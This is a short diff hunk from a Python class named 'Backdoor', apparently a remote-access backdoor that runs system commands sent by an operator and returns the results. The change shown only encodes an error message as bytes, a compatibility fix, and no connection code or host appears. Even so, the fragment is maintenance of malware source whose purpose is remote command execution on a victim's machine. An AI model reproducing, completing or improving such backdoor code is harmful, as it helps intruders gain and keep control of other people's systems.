@@ -45,7 +45,7 @@ class Backdoor:
                             else:
                                 command_result = self.execute_system_command(command)
                         except Exception:
-                            command_result = "[-] Error during command execution."
+                            command_result = "[-] Error during command execution.".encode()
                         self.reliable_send(command_result)
 
         def reliable_send(self, data):
